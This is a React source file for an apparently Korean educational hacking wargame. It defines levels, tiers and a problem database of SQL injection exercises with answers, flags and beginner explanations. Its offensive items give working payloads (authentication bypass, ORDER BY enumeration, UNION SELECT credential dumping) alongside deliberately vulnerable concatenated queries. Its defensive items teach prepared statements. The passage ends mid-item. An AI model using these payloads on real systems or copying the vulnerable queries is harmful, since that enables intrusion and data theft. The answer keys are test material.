import React, { useState, useRef, useEffect } from 'react';
import { 
  Terminal, Send, ShieldAlert, Cpu, LogIn, User, Play, BookOpen, 
  ArrowRight, Flag, Target, Layers, Settings, BarChart2, CheckCircle2, 
  Bookmark, Lock, Award, ShieldCheck, Activity, MessageSquare, ThumbsUp, 
  RotateCcw, Sparkles, AlertTriangle, Database, Code, Globe, Key, Binary,
  FileSearch, RefreshCw, Radio
} from 'lucide-react';

// ==========================================
// 0. BACKEND API CLIENT (Netlify Functions + Neon)
// ==========================================

export type AuthUser = {
  id: number;
  username: string;
  points: number;
  solvedIds: string[];
  tacticalMastery: Record<string, { tier: number; progress: number }>;
};

const apiRequest = async (path: string, options: RequestInit = {}) => {
  const res = await fetch(`/api${path}`, {
    ...options,
    headers: { 'Content-Type': 'application/json', ...(options.headers || {}) },
  });
  const data = await res.json().catch(() => ({}));
  if (!res.ok) throw new Error(data.error || '요청 처리 중 오류가 발생했습니다.');
  return data;
};

const authApi = {
  register: (username: string, password: string) =>
    apiRequest('/auth/register', { method: 'POST', body: JSON.stringify({ username, password }) }) as Promise<{ token: string; user: AuthUser }>,
  login: (username: string, password: string) =>
    apiRequest('/auth/login', { method: 'POST', body: JSON.stringify({ username, password }) }) as Promise<{ token: string; user: AuthUser }>,
  me: (token: string) =>
    apiRequest('/me', { headers: { Authorization: `Bearer ${token}` } }) as Promise<{ user: AuthUser }>,
  deleteAccount: (token: string, password: string) =>
    apiRequest('/auth/delete', { method: 'DELETE', headers: { Authorization: `Bearer ${token}` }, body: JSON.stringify({ password }) }) as Promise<{ success: boolean }>,
  sync: (token: string, payload: { points: number; solvedIds: string[]; tacticalMastery: Record<string, unknown> }) =>
    apiRequest('/sync', { method: 'POST', headers: { Authorization: `Bearer ${token}` }, body: JSON.stringify(payload) }),
  rankings: () =>
    apiRequest('/rankings') as Promise<{ rankings: { rank: number; username: string; points: number }[] }>,
  getPosts: () =>
    apiRequest('/posts') as Promise<{ posts: CommunityPost[] }>,
  createPost: (payload: { title: string; content: string; author: string; category: 'problem' | 'free' }) =>
    apiRequest('/posts', { method: 'POST', body: JSON.stringify(payload) }) as Promise<{ post: CommunityPost }>,
  likePost: (postId: number) =>
    apiRequest(`/posts/${postId}/like`, { method: 'POST' }) as Promise<{ likes: number }>,
  getComments: (postId: number) =>
    apiRequest(`/posts/${postId}/comments`) as Promise<{ comments: PostComment[] }>,
  addComment: (postId: number, payload: { author: string; content: string }) =>
    apiRequest(`/posts/${postId}/comments`, { method: 'POST', body: JSON.stringify(payload) }) as Promise<{ comment: PostComment }>,
};

// ==========================================
// 1. TYPE DEFINITIONS & CONSTANTS
// ==========================================

export type ViewState = 
  | 'landing' 
  | 'beginner_basics'
  | 'tutorial_intro' 
  | 'main' 
  | 'wargames' 
  | 'arena_play' 
  | 'arena_clear' 
  | 'profile' 
  | 'titles' 
  | 'community'
  | 'rankings'
  | 'guide'
  | 'debrief'
  | 'speedquiz'
  | 'aichallenge'
  | 'ai_help'
  | 'login';

export type RoleMode = 'Hacking' | 'Security';

// 초보자용 "실제 웹페이지처럼 보이는" 미니 실습 UI (터미널 대신/함께 노출). 로그인 폼·댓글창처럼
// 실제 웹 요소에 대응되는 극초반 Tutorial 문제에만 선택적으로 붙임. 값 검증 로직은 터미널과 완전히 동일.
export type MockWebUi = {
  urlBar: string;
  siteLabel: string;
  fieldLabel: string;
  fieldPlaceholder?: string;
  buttonLabel: string;
  extraFieldLabel?: string;
};

export type ProblemItem = {
  id: string;
  title: string;
  category: string;
  role: RoleMode;
  level: string;
  xp: number;
  answer: string;
  flag: string;
  desc: string;
  code: string;
  language: string;
  hint: string;
  cwe?: string;
  mockUi?: MockWebUi;
};

export type Message = { role: 'user' | 'ai'; text: string };
export type Log = { type: 'info' | 'error' | 'success' | 'warning'; text: string };

export type CommunityPost = {
  id: number;
  title: string;
  content: string;
  author: string;
  created_at: string;
  likes: number;
  category?: 'problem' | 'free';
};

export type PostComment = {
  id: number;
  post_id: number;
  author: string;
  content: string;
  created_at: string;
};

export type LevelRankIconType =
  | 'sprout'
  | 'bronze'
  | 'silver'
  | 'gold'
  | 'platinum'
  | 'diamond'
  | 'master'
  | 'challenger'
  | 'hacker';

export type LevelTierMeta = {
  color: string;
  glow: string;
  iconType: LevelRankIconType;
  isRainbow?: boolean;
};

export const levelTierMetaMap: Record<string, LevelTierMeta> = {
  '새싹 개발자': { color: '#3f3f46', glow: 'rgba(63, 63, 70, 0.9)', iconType: 'sprout' },
  '브론즈': { color: '#b87333', glow: 'rgba(184, 115, 51, 0.92)', iconType: 'bronze' },
  '실버': { color: '#c0c0c0', glow: 'rgba(192, 192, 192, 0.95)', iconType: 'silver' },
  '골드': { color: '#ffd700', glow: 'rgba(255, 215, 0, 0.95)', iconType: 'gold' },
  '플래티넘': { color: '#2dd4bf', glow: 'rgba(45, 212, 191, 0.95)', iconType: 'platinum' },
  '다이아몬드': { color: '#38bdf8', glow: 'rgba(56, 189, 248, 0.95)', iconType: 'diamond' },
  '마스터': { color: '#a855f7', glow: 'rgba(168, 85, 247, 0.95)', iconType: 'master' },
  '챌린저': { color: '#fb923c', glow: 'rgba(251, 146, 60, 0.95)', iconType: 'challenger' },
  '해커': { color: '#22c55e', glow: 'rgba(34, 197, 94, 0.95)', iconType: 'hacker' },
  '화이트 해커': { color: '#22d3ee', glow: 'rgba(34, 211, 238, 0.95)', iconType: 'hacker' },
  '블랙 해커': { color: '#ef4444', glow: 'rgba(239, 68, 68, 0.95)', iconType: 'hacker' },
};

export const developerLevelTiers = [
  { range: 'Lv.1~9', name: '새싹 개발자' },
  { range: 'Lv.10~19', name: '브론즈' },
  { range: 'Lv.20~29', name: '실버' },
  { range: 'Lv.30~39', name: '골드' },
  { range: 'Lv.40~49', name: '플래티넘' },
  { range: 'Lv.50~59', name: '다이아몬드' },
  { range: 'Lv.60~79', name: '마스터' },
  { range: 'Lv.80~99', name: '챌린저' },
  { range: 'Lv.100+', name: '해커' },
];

// 해커 티어에 도달하면 선택할 수 있는 하위 칭호 (본 레벨 티어와 별개로 장착만 가능)
export const hackerSubTitles = ['화이트 해커', '블랙 해커'];

export const formatExp = (num: number) => {
  if (num >= 1000000) return (num / 1000000).toFixed(1).replace(/\.0$/, '') + 'M';
  if (num >= 1000) return (num / 1000).toFixed(1).replace(/\.0$/, '') + 'K';
  return num.toString();
};

// DB users.points 컬럼(Postgres INT32)이 저장할 수 있는 절대 최댓값 — 이 값에 도달하면 "MAX"로 표기
export const MAX_TOTAL_XP = 2147483647;

// 레벨 곡선: 완주 시 실버 안팎(~9천 XP), 챌린저는 ~510만 XP, 해커(Lv.100)는 ~4950만 XP 필요.
// DB points 컬럼(INT32) 최댓값(2,147,483,647)까지 채워도 약 Lv.133까지만 도달하도록 설계됨.
export const getLevelInfo = (totalExp: number) => {
  let level = 1;
  let currentExp = totalExp;
  while (true) {
    let requiredExp = Math.floor(80 * Math.pow(1.12, level - 1));
    if (currentExp >= requiredExp) {
      currentExp -= requiredExp;
      level++;
    } else {
      return { level, currentExp, requiredExp };
    }
  }
};

export const getDeveloperLevelTier = (level: number) => {
  if (level >= 100) return '해커';
  if (level >= 80) return '챌린저';
  if (level >= 60) return '마스터';
  if (level >= 50) return '다이아몬드';
  if (level >= 40) return '플래티넘';
  if (level >= 30) return '골드';
  if (level >= 20) return '실버';
  if (level >= 10) return '브론즈';
  return '새싹 개발자';
};

export const getDeveloperLevelTierMeta = (tierName: string) => {
  return levelTierMetaMap[tierName] ?? levelTierMetaMap['새싹 개발자'];
};

export const getLevelTierBadgeStyle = (tierName: string): React.CSSProperties => {
  const meta = getDeveloperLevelTierMeta(tierName);
  return {
    color: meta.color,
    border: `1px solid ${meta.color}`,
    background: `${meta.color}22`,
    boxShadow: `0 0 18px ${meta.glow}, 0 0 36px ${meta.color}70, inset 0 0 16px ${meta.color}32`,
    textShadow: `0 0 10px ${meta.glow}, 0 0 22px ${meta.color}`,
  };
};

export const categories = [
  { id: 'sql', name: 'SQL Injection', desc: 'DB 인증 체계 우회 및 파라미터화 방어', icon: '💉' },
  { id: 'xss', name: 'XSS 스크립트', desc: 'DOM 조작, 세션 탈취 및 시큐어 인코딩', icon: '📝' },
  { id: 'memory', name: '메모리 취약점', desc: '버퍼 오버플로우 분석 및 안전한 메모리 관리', icon: '🧠' },
  { id: 'crypto', name: '암호 해독', desc: '해시 결함, 취약한 대칭키 및 솔팅 검증', icon: '🔐' },
  { id: 'network', name: '네트워크 패킷', desc: '평문 트래픽 스니핑 및 SSL/TLS 암호화', icon: '🌐' },
  { id: 'web', name: '웹 해킹 (LFI/RCE)', desc: '경로 탐색(Path Traversal) 및 파라미터 변조', icon: '🕸️' },
  { id: 'forensic', name: '디지털 포렌식', desc: '은폐된 아티팩트 및 메모리 덤프 추적', icon: '🔍' },
  { id: 'reversing', name: '리버싱 분석', desc: '바이너리 분기점 역어셈블 및 패치', icon: '⚙️' }
];

// 워게임 Level 1~3 허브: Tutorial/Easy → Level 1, Medium → Level 2, Hard → Level 3
export const levelTierOf = (p: ProblemItem): 1 | 2 | 3 => {
  if (p.level === 'Hard') return 3;
  if (p.level === 'Medium') return 2;
  return 1;
};

export const levelTierMeta: Record<1 | 2 | 3, { name: string; tag: string; color: string; icon: string }> = {
  1: { name: 'Level 1 공략집', tag: 'EASY', color: '#22d3ee', icon: '📖' },
  2: { name: 'Level 2 공략집', tag: 'MEDIUM', color: '#fb923c', icon: '⚔️' },
  3: { name: 'Level 3 공략집', tag: 'HARD', color: '#a855f7', icon: '💀' },
};

// 완전 초보자를 위한 카테고리별 쉬운 비유와 1줄 설명 (Tutorial/Level 1 브리핑 상단 노출)
export const categoryPrimers: Record<string, string> = {
  'SQL Injection': '🏦 [은행 창구 비유] 창구 직원에게 "홍길동 잔액 알려줘"라고 쪽지를 줘야 하는데, "홍길동 잔액... 아니면 그냥 전 고객 잔액 다 보여줘!"라고 쪽지를 조작해서 직원을 속이는 기법이에요. 웹사이트가 데이터베이스에 질문할 때 입력값을 검증하지 않으면 비밀번호 없이 로그인되거나 전체 데이터가 털릴 수 있어요.',
  'XSS 스크립트': '💌 [마법 쪽지 비유] 학교 게시판에 일반 글 대신 "이 글을 읽는 순간 가방 속 사탕(로그인 쿠키)을 내 사물함으로 보내라"는 마법 주문(자바스크립트 코드)을 몰래 붙여두는 기법이에요. 다른 사람이 그 게시글을 열람하는 순간 그 사람 브라우저에서 공격자 코드가 자동 실행돼요.',
  '메모리 취약점': '🥤 [넘치는 물컵 비유] 종이컵(버퍼)에 물을 정해진 양만 부어야 하는데, 1리터짜리 물을 마구 부어서 물이 넘치고 옆에 놓인 중요한 서류(컴퓨터 제어권)까지 흠뻑 적셔버리는 현상이에요. 컴퓨터가 정해둔 저장 공간을 초과해서 데이터를 밀어넣어 해커 마음대로 조종하게 만듭니다.',
  '암호 해독': '🧂 [양념 치기 비유] 비밀번호를 암호화할 때 "소금(Salt)" 같은 무작위 양념을 치지 않고 그대로 저장하면, 해커가 미리 수억 개의 비밀번호를 계산해둔 "암호 사전(레인보우 테이블)"을 들이대어 진짜 비밀번호를 몇 초 만에 알아낼 수 있어요.',
  '네트워크 패킷': '📬 [엽서 vs 봉투 비유] 친구에게 비밀 편지를 보낼 때 봉투에 넣어 봉하지 않고(HTTPS), 투명한 엽서(HTTP)로 보내면 우체부나 길가는 사람(같은 와이파이 사용자)이 편지 내용을 그대로 훔쳐볼 수 있어요. 이때 오가는 대화를 도청하는 걸 "패킷 스니핑"이라고 해요.',
  '웹 해킹 (LFI/RCE)': '🚪 [비밀 창고 열쇠 비유] 도서관 사서에게 "어린이 동화책 주세요"라고 해야 하는데, "동화책 말고 계단 타고 올라가서 사장실 비밀 금고 파일 주세요(../)"라고 요청해 원래 열람할 수 없는 서버의 시스템 비밀 문서를 훔쳐보는 기법이에요.',
  '디지털 포렌식': '🔍 [디지털 과학 수사대] 범인이 컴퓨터나 사진의 흔적을 지우고 도망쳤더라도, 파일 속 숨겨진 촬영 시간, GPS 위치, 파일 고유 지문(매직 바이트) 등의 디지털 단서를 돋보기로 찾아내어 범인을 추적하는 과학 수사 기법이에요.',
  '리버싱 분석': '🧩 [장난감 역분해 비유] 비밀번호를 눌러야 열리는 장난감 상자의 설명서가 없을 때, 상자를 드라이버로 분해해서 내부 톱니바퀴와 전선이 어떻게 연결되어 있는지 거꾸로 살펴보며 비밀번호가 무엇인지 알아내는 기법이에요.',
};

export const tacticalTierRequirements: Record<number, number> = {
  0: 100, 1: 250, 2: 500, 3: 1000, 4: 2500,
};

export type TacticalMastery = { tier: number; progress: number; };

export const getTierRequirement = (tier: number) => tacticalTierRequirements[Math.max(0, Math.min(4, tier))] ?? 2500;

export const getMasteryPercent = (mastery: TacticalMastery) => {
  if (mastery.tier >= 5) return 100;
  return Math.min(100, (mastery.progress / getTierRequirement(mastery.tier)) * 100);
};

export const getTierTextColor = (tier: number) => {
  const tierColorMap: Record<number, string> = {
    0: '#64748b', 1: '#00f2fe', 2: '#a3e635', 3: '#facc15', 4: '#fb923c', 5: '#f472b6',
  };
  return tierColorMap[tier] ?? '#64748b';
};

export const getTierGaugeStyle = (tier: number) => {
  if (tier >= 5) {
    return {
      background: 'linear-gradient(90deg, #ff004c, #ff9f1c, #fff200, #00ff85, #00c2ff, #7c3aed, #ff00c8)',
      boxShadow: '0 0 14px rgba(255, 255, 255, 0.75)',
    };
  }
  const color = getTierTextColor(tier);
  return { backgroundColor: color, boxShadow: `0 0 12px ${color}` };
};

// ==========================================
// 2. MASTER PROBLEM DATABASE (1 + 2 + 3)
// ==========================================

export const masterProblemDB: ProblemItem[] = [
  // --- SQL Injection / Hacking ---
  {
    id: 'sq_h_t_1',
    title: '[튜토리얼 1단계] 비밀번호 없이 관리자로 로그인하기 (인증 우회 기초)',
    category: 'SQL Injection',
    role: 'Hacking',
    level: 'Tutorial',
    xp: 50,
    cwe: 'CWE-89',
    answer: "admin'--",
    flag: 'FLAG{SQL_AUTH_BYPASS_ADMIN}',
    mockUi: {
      urlBar: 'target.local/login',
      siteLabel: '🔐 TargetSite 로그인 (입문 실습)',
      fieldLabel: '아이디 (ID)',
      fieldPlaceholder: "admin'-- 입력하기",
      buttonLabel: '로그인',
      extraFieldLabel: '비밀번호 (PW)',
    },
    desc: `🌟 <b>어떤 상황인가요? (은행 창구 비유)</b><br>
보통은 아이디와 비밀번호가 둘 다 맞아야 로그인이 되죠. 그런데 이 웹사이트는 여러분이 입력한 아이디를 검증도 안 하고 데이터베이스 질문(SQL)에 그대로 이어붙이고 있어요.
<div class='code-snippet'>SELECT * FROM users WHERE id='<span style="color:#f87171;">[여러분이 입력한 아이디]</span>' AND pw='[비밀번호]'</div>

🔍 <b>취약점의 비밀: 따옴표(')와 주석(--)의 마법</b><br>
SQL 문법에서 <code>--</code>(하이픈 두 개)는 <b>"이 기호 뒤에 오는 모든 글자는 없는 셈 쳐라(주석 처리)"</b>라는 뜻이에요.<br>
아이디 칸에 <code class="pt-answer">admin'--</code> 를 적어 넣으면:
1. <code>admin'</code>의 따옴표가 원래 있던 따옴표를 닫아버려요.
2. 그 뒤의 <code>--</code> 기호가 뒤에 남아있던 <code>AND pw='...'</code>(비밀번호 검사)를 통째로 무시해 버려요!
<div class='code-snippet'>SELECT * FROM users WHERE id='admin'<span style="color:#64748b;">' AND pw='...' ← -- 때문에 아예 사라짐!</span></div>
결국 비밀번호 검사가 통째로 증발해서, 비밀번호를 몰라도 <b>admin(관리자)</b>으로 즉시 로그인됩니다!

<br>🎯 <b>미션 클리어 방법</b><br>
코드를 직접 짤 필요가 전혀 없어요! 아래 로그인 창(또는 검은색 터미널 창)에 정답 문자열을 그대로 타이핑하고 [로그인] 또는 [RUN] 버튼을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">admin'--</code>`,
    code: `const username = req.query.id;
const password = req.query.pw;

// 취약한 쿼리: 입력값을 그대로 이어붙임
const query = \`SELECT * FROM users WHERE id='\${username}' AND pw='\${password}'\`;
const user = await db.query(query);`,
    language: 'javascript',
    hint: "정답은 [admin'--] 입니다. 작은따옴표 하나(')와 하이픈 두 개(--)를 admin 바로 뒤에 붙여서 입력창에 그대로 입력해 보세요!"
  },
  {
    id: 'sq_h_t_2',
    title: '[튜토리얼 2단계] 아이디도 모를 때 로그인하기 (무조건 참 조작)',
    category: 'SQL Injection',
    role: 'Hacking',
    level: 'Tutorial',
    xp: 60,
    cwe: 'CWE-89',
    answer: "' OR '1'='1",
    flag: 'FLAG{TAUTOLOGY_ALWAYS_TRUE}',
    mockUi: {
      urlBar: 'target.local/login',
      siteLabel: '🔐 TargetSite 로그인 (만능 열쇠 실습)',
      fieldLabel: '아이디 (ID)',
      fieldPlaceholder: "' OR '1'='1 입력하기",
      buttonLabel: '로그인',
      extraFieldLabel: '비밀번호 (PW)',
    },
    desc: `🌟 <b>어떤 상황인가요? (만능 열쇠 비유)</b><br>
앞선 1단계에서는 관리자 아이디가 'admin'이라는 걸 알고 있었어요. 그런데 관리자 아이디조차 모른다면 어떻게 해야 할까요?<br>
이럴 때는 데이터베이스에게 <b>"무조건 맞는 말(항상 참)"</b>을 속삭여서 문을 열게 만들 수 있어요!

🔍 <b>취약점의 비밀: 1은 항상 1이다!</b><br>
아이디 칸에 <code class="pt-answer">' OR '1'='1</code> 을 적어 넣으면, 데이터베이스 질문이 이렇게 바뀝니다:
<div class='code-snippet'>SELECT * FROM users WHERE id='' <span style="color:#22d3ee;">OR '1'='1'</span> ...</div>
컴퓨터에게 <b>"아이디가 빈칸이거나, 아니면 1이 1과 같으면 통과시켜줘"</b>라고 묻는 거예요. <code>1=1</code>은 우주가 무너져도 항상 맞는 말(True)이죠!<br>
질문 전체가 무조건 참이 되기 때문에, 데이터베이스는 첫 번째 계정(보통 최고 관리자)으로 문을 활짝 열어줍니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 아이디 칸(또는 터미널 창)에 따옴표와 OR 조건을 그대로 입력하고 로그인 버튼을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">' OR '1'='1</code>`,
    code: `// 취약한 로그인 쿼리 조작 로직
const sql = "SELECT * FROM users WHERE id='" + inputId + "' AND pw='" + inputPw + "'";
db.execute(sql);`,
    language: 'javascript',
    hint: "정답은 [' OR '1'='1] 입니다. 작은따옴표(')로 시작해서 한 칸 띄우고 OR 한 칸 띄우고 '1'='1 을 그대로 적어 넣으세요!"
  },
  {
    id: 'sq_h_e_1',
    title: '[실전 Level 1] MySQL 샵(#) 기호로 주석 달기',
    category: 'SQL Injection',
    role: 'Hacking',
    level: 'Easy',
    xp: 100,
    cwe: 'CWE-89',
    answer: "admin' #",
    flag: 'FLAG{MYSQL_HASH_COMMENT_SUCCESS}',
    mockUi: {
      urlBar: 'target.local/admin/login',
      siteLabel: '🔐 MySQL 관리자 로그인',
      fieldLabel: '아이디 (username)',
      fieldPlaceholder: "admin' # 입력하기",
      buttonLabel: '로그인',
      extraFieldLabel: '비밀번호 (password)',
    },
    desc: `🌟 <b>어떤 상황인가요?</b><br>
전 세계에서 가장 많이 쓰이는 데이터베이스 중 하나인 <b>MySQL</b>에서는, <code>--</code> 대신 <code>#</code>(샵/해시) 기호도 똑같이 "뒤쪽 글자 전부 무시(주석)"의 의미로 쓰여요.

🔍 <b>취약점의 비밀</b><br>
<div class='code-snippet'>SELECT * FROM admin_db WHERE username='<span style="color:#f87171;">admin' #</span>' AND pass='...'</div>
아이디 칸에 <code class="pt-answer">admin' #</code> 를 넣으면:
따옴표(')로 아이디 부분을 끝내고, <code>#</code> 기호로 비밀번호 검사 부분을 한 글자로 날려버릴 수 있습니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 아이디 입력창에 관리자 이름과 샵 기호를 입력하고 로그인 버튼을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">admin' #</code>`,
    code: `const sql = \`SELECT * FROM admin_db WHERE username='\${req.body.username}' AND pass='\${req.body.password}'\`;`,
    language: 'sql',
    hint: "정답은 [admin' #] 입니다. admin 뒤에 작은따옴표('), 공백 한 칸, 그리고 # 기호를 순서대로 입력하세요."
  },

  // --- SQL Injection / Security (Defensive) ---
  {
    id: 'sq_s_t_1',
    title: '[튜토리얼 1단계] SQL 주입 원천 차단: 쿼리 틀 만들기 (Prepared Statement)',
    category: 'SQL Injection',
    role: 'Security',
    level: 'Tutorial',
    xp: 50,
    cwe: 'CWE-89',
    answer: "PreparedStatement pstmt = connection.prepareStatement(query);",
    flag: 'FLAG{PREPARED_STATEMENT_SECURED}',
    desc: `🌟 <b>어떤 상황인가요? (붕어빵 틀 비유)</b><br>
해커가 따옴표나 <code>--</code>를 섞어서 문장을 왜곡하는 이유는, 질문과 사용자의 입력값이 뒤섞이기 때문이에요.<br>
이를 막는 가장 완벽한 방법은 <b>"붕어빵 틀"</b>처럼 질문의 뼈대를 먼저 단단하게 만들어두고(Prepare), 값은 나중에 팥만 따로 집어넣는 방식이에요!

🔍 <b>보안 패치의 핵심: Statement 대신 PreparedStatement 쓰기</b><br>
Java에서는 취약한 <code>createStatement()</code> 대신, 안전한 <code>connection.prepareStatement(query)</code>를 사용해 안전한 틀을 생성합니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 검은색 터미널 창에, 안전한 PreparedStatement 객체를 만드는 아래 코드 한 줄을 그대로 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">PreparedStatement pstmt = connection.prepareStatement(query);</code>`,
    code: `// 취약한 코드 (문자열 결합 방식)
Statement stmt = connection.createStatement();
ResultSet rs = stmt.executeQuery("SELECT * FROM users WHERE id='" + userInput + "'");

// [보안 패치: PreparedStatement로 안전한 틀 생성]`,
    language: 'java',
    hint: "정답은 [PreparedStatement pstmt = connection.prepareStatement(query);] 입니다. 철자가 길다면 드래그 복사해서 터미널 창에 붙여넣고 RUN을 눌러보세요!"
  },
  {
    id: 'sq_s_t_2',
    title: '[튜토리얼 2단계] 안전하게 값만 채워 넣기 (파라미터 바인딩)',
    category: 'SQL Injection',
    role: 'Security',
    level: 'Tutorial',
    xp: 60,
    cwe: 'CWE-89',
    answer: "pstmt.setString(1, userInput);",
    flag: 'FLAG{PARAM_BINDING_COMPLETE}',
    desc: `🌟 <b>어떤 상황인가요?</b><br>
앞선 1단계에서 <code>WHERE id = ?</code> 처럼 물음표(자리표시자)가 있는 쿼리 틀을 만들었어요.<br>
이제 이 물음표 자리에 사용자가 입력한 문자열(userInput)을 <b>"오직 순수한 데이터"</b>로만 안전하게 전달해 줄 차례예요!

🔍 <b>보안 패치의 핵심</b><br>
<code>pstmt.setString(1, userInput);</code> 를 쓰면, 사용자가 그 안에 따옴표(')나 주석(--)을 100만 개 넣어도 컴퓨터는 절대 명령어로 오해하지 않고 오직 글자 그대로만 읽습니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 터미널 입력창에 1번 물음표에 값을 채우는 코드를 입력하고 [RUN]을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">pstmt.setString(1, userInput);</code>`,
    code: `String query = "SELECT * FROM users WHERE id = ? ";
PreparedStatement pstmt = connection.prepareStatement(query);
// [이곳에 안전한 바인딩 코드 작성]`,
    language: 'java',
    hint: "정답은 [pstmt.setString(1, userInput);] 입니다. 1번째 물음표에 userInput 문자열을 바인딩하는 코드입니다."
  },
  {
    id: 'sq_h_e_2',
    title: '[실전 Level 1] ORDER BY로 데이터베이스 컬럼 개수 알아내기',
    category: 'SQL Injection',
    role: 'Hacking',
    level: 'Easy',
    xp: 110,
    cwe: 'CWE-89',
    answer: '1 ORDER BY 4--',
    flag: 'FLAG{ORDER_BY_COLUMN_COUNT_FOUND}',
    mockUi: {
      urlBar: 'target.local/posts/view?id=',
      siteLabel: '📄 게시글 조회 (컬럼 탐색)',
      fieldLabel: '게시글 번호 (id)',
      fieldPlaceholder: '1 ORDER BY 4-- 입력하기',
      buttonLabel: '조회',
    },
    desc: `🌟 <b>어떤 상황인가요? (도서관 서가 비유)</b><br>
데이터를 몰래 훔쳐보는 고급 해킹(UNION)을 하려면, 먼저 이 테이블이 몇 칸짜리 서가(컬럼 수)인지 알아내야 해요.<br>
가장 쉬운 방법은 <code>ORDER BY</code>(순서 정렬)에 숫자를 1, 2, 3, 4 늘려보며 물어보는 거예요.

🔍 <b>취약점의 비밀</b><br>
"1번째 칸 기준으로 정렬해줘(ORDER BY 1)" → 성공!<br>
"3번째 칸 기준으로 정렬해줘(ORDER BY 3)" → 성공!<br>
"4번째 칸 기준으로 정렬해줘(ORDER BY 4)" → <b>"4번째 칸은 없는데요?!" 에러 발생!</b><br>
이렇게 에러가 나는 순간, "아! 이 테이블은 딱 3칸(3개 컬럼)이구나!" 하고 바로 파악할 수 있어요.

<br>🎯 <b>미션 클리어 방법</b><br>
컬럼이 3개인 이 테이블에서 에러를 유발하는 4번째 정렬 명령어를 입력해 보세요.
<br>👉 입력할 정답: <code class="pt-answer">1 ORDER BY 4--</code>`,
    code: `const id = req.query.id;
const query = \`SELECT title, author, content FROM posts WHERE id='\${id}'\`;
const rows = await db.query(query);`,
    language: 'sql',
    hint: "정답은 [1 ORDER BY 4--] 입니다. 게시글 번호 칸에 1을 적고 한 칸 띄운 뒤 ORDER BY 4-- 를 입력하세요."
  },
  {
    id: 'sq_h_e_3',
    title: '[실전 Level 1] UNION SELECT로 비밀 회원 정보 빼내기',
    category: 'SQL Injection',
    role: 'Hacking',
    level: 'Easy',
    xp: 130,
    cwe: 'CWE-89',
    answer: "-1 UNION SELECT username,password,3 FROM users--",
    flag: 'FLAG{UNION_SELECT_CREDENTIALS_LEAKED}',
    mockUi: {
      urlBar: 'target.local/posts/view?id=',
      siteLabel: '📄 게시글 조회 (데이터 탈취)',
      fieldLabel: '게시글 번호 (id)',
      fieldPlaceholder: '-1 UNION SELECT username,password,3 FROM users-- 입력',
      buttonLabel: '조회',
    },
    desc: `🌟 <b>어떤 상황인가요? (영수증 밑에 쪽지 덧붙이기 비유)</b><br>
앞서 컬럼이 3개라는 걸 알아냈다면, 이제 <code>UNION SELECT</code>를 써서 게시글 대신 <b>비밀 회원 명단(아이디/비밀번호)</b>을 끼워 넣어 화면에 출력시킬 수 있어요!

🔍 <b>취약점의 비밀: 없는 번호(-1)로 원래 글 비우기</b><br>
원래 게시글이 화면에 나오면 비밀 정보가 묻힐 수 있으므로, 존재하지 않는 <code>-1</code>번 글을 요청해서 원래 자리를 비우고, 그 뒤에 <code>UNION SELECT</code>로 users 테이블의 계정 정보를 끌어옵니다.

<br>🎯 <b>미션 클리어 방법</b><br>
아래 게시글 번호 칸에 UNION 결합 페이로드를 그대로 입력하세요.
<br>👉 입력할 정답: <code class="pt-answer">-1 UNION SELECT username,password,3 FROM users--</code>`,
    code: `const id = req.query.id;
const query = \`SELECT title, author, content FROM posts WHERE id='\${id}'\`;
const rows = await db.query(query);
res.render('post', { rows });`,
    language: 'sql',
    hint: "정답은 [-1 UNION SELECT username,password,3 FROM users--] 입니다. -1 뒤에 UNION SELECT 로 회원 테이블을 엮어주세요."
  },
  {
    id: 'sq_h_e_4',
    title: '[실전 Level 1] 따옴표 없이 숫자 파라미터 공격하기',
    category: 'SQL Injection',
    role: 'Hacking',
    level: 'Easy',
    xp: 105,
    cwe: 'CWE-89',
    answer: "1 OR 1=1",
    flag: 'FLAG{NUMERIC_INJECTION_NO_QUOTES}',
    mockUi: {
      urlBar: 'target.local/product/view?id=',
      siteLabel: '🛒 상품 상세 조회 (숫자형 실습)',
      fieldLabel: '상품 번호 (id)',
      fieldPlaceholder: '1 OR 1=1 입력하기',
      buttonLabel: '조회',
    },
    desc: `🌟 <b>어떤 상황인가요?</b><br>
지금까지는 입력값이 따옴표(')로 감싸져 있었지만, 이번 웹사이트는 상품 번호(id)가 숫자라서 <b>따옴표 없이</b> 쿼리를 만듭니다.
<div class='code-snippet'>SELECT * FROM products WHERE id=<span style="color:#f87171;">[여러분이 입력한 숫자]</span></div>

🔍 <b>취약점의 비밀: 따옴표를 닫을 필요도 없다!</b><br>
따옴표가 없으니 탈출할 따옴표(')도 필요 없습니다. 그냥 상품 번호 뒤에 <code class="pt-answer">1 OR 1=1</code> 을 붙이면, 쿼리가 <code>WHERE id=1 OR 1=1</code> 이 되어 무조건 모든 상품이 다 쏟아져 나옵니다!

<br>🎯 <b>미션 클리어 방법</b><br>
아래 상품 번호 칸에 따옴표 없이 정답을 입력하고 조회 버튼을 누르세요.
<br>👉 입력할 정답: <code class="pt-answer">1 OR 1=1</code>`,
    code: `const id = req.query.id;
const query = \`SELECT * FROM products WHERE id=\${id}\`; // 따옴표 없이 결합됨
const rows = await db.query(query);`,
    language: 'sql',
    hint: "정답은 [1 OR 1=1] 입니다. 따옴표 없이 숫자 1, 공백, OR, 공백, 1=1 을 입력하세요."
  },
  {
    id: 'sq_h_e_5',
    title: '[실전 Level 1] 검색창에 퍼센트(%) 하나로 전체 회원 명단 털기',
    category: 'SQL Injection',
    role: 'Hacking',
    level: 'Easy',
    xp: 110,
    cwe: 'CWE-89',
    answer: "%",
    flag: 'FLAG{LIKE_WILDCARD_FULL_DUMP}',
    mockUi: {
      urlBar: 'target.local/users/search',
      siteLabel: '🔍 회원 이름 검색',
      fieldLabel: '검색할 이름',
      fieldPlaceholder: '% 입력하기',
      buttonLabel: '검색',
    },
    desc: `🌟 <b>어떤 상황인가요? (만능 글자 비유)</b><br>
회원 검색 기능은 보통 <code>LIKE '%검색어%'</code> 라는 문법을 써요. 여기서 <code>%</code>는 <b>"아무 글자나 몇 개든 다 포함된다"</b>는 뜻의 마법 카드예요.

🔍 <b>취약점의 비밀: %를 입력창에 넣으면?</b><br>
